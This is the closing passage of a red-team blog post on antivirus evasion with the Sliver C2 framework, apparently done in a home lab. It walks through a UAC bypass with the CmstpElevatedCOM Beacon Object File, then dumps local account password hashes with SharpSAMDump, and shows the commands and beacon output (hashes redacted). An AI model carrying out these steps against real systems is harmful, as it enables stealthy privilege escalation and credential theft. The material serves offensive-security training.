+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeShutdownPrivilege           Shut down the system                              Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeUndockPrivilege             Remove computer from docking station              Disabled                      
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
+SeTimeZonePrivilege           Change the time zone                              Disabled</code></pre>
+</doc-codeblock></div>
+<p>We see our user is part of the <code v-pre>Administrators</code> group but we are not in a high integrity process. This means that we have to bypass UAC (User Access Control) to get a shell with full Administrator privileges. There is an excellent project called <a href="https://github.com/icyguider/UAC-BOF-Bonanza">UAC-BOF-Bonanza</a> that includes Beacon Object Files that can be loaded to Sliver in order to bypass UAC. After cloning the repository, we can load them into Sliver as follows (e.g. <code v-pre>CmstpElevatedCOM</code>):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
+$ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/</code></pre>
+</doc-codeblock></div>
+<p>The above UAC Bypass creates an elevated <code v-pre>ICMLuaUtil COM</code> object and calls its ShellExec function to execute the provided file on disk. If it is the first time using these custom extension, restart yuor Sliver server. We can now run the <code v-pre>CmstpElevatedCom</code> task from within our beacon that executes our loader.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-privesc.png" alt="Sliver Privesc">
+    <figcaption class="caption">Sliver Privesc</figcaption>
+</figure>
+</p>
+<p>This will launch another beacon process running as Administrator. With these privileges we can try to dump all credentials from LSASS. To stay stealthy, let&#x27;s use <a href="https://github.com/jojonas/SharpSAMDump">SharpSAMDump</a>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; execute-assembly -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
+
+[*] Tasked beacon ESSENTIAL_THEATER (c4af87ff)
+
+[+] ESSENTIAL_THEATER completed task c4af87ff
+
+[*] Output:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
+John:1001:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</code></pre>
+</doc-codeblock></div>
+<p>We managed to obtain the hashes of all accounts on the machine, including the administrator hash.</p>
+
+                            
+                            <!-- Required only on API pages -->
+                            <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                        </div>
+                        <footer class="clear-both">
+                        
+                            <nav class="flex mt-14">
+                                <div class="w-1/2">
+                                </div>
+                        
+                                <div class="w-1/2">
+                                    <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../blog/proxmox-homelab-part4/">
+                                        <span>
+                                            <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Older</span>
+                                            <span class="block mt-1">Active Directory Home Lab with Proxmox - Part 4</span>
+                                        </span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                    </a>
+                                </div>
+                            </nav>
+                        </footer>
+                    </main>
+                </div>
+
+            </div>
+        </div>
+    
+        <div class="border-t dark:border-dark-650">
+            <div class="max-w-core mx-auto px-6 py-6">
+                <footer>
+                    <div class="flex flex-wrap items-center justify-between">
+                        <div class="pt-3">
+                            <ul class="flex flex-wrap items-center text-sm">
+                            </ul>
+                        </div>
+                        <div class="docs-copyright pt-3 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                    </div>
+                
+                    <div class="flex sm:justify-center">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </footer>
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Anti-Virus Evasion with Sliver C2", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
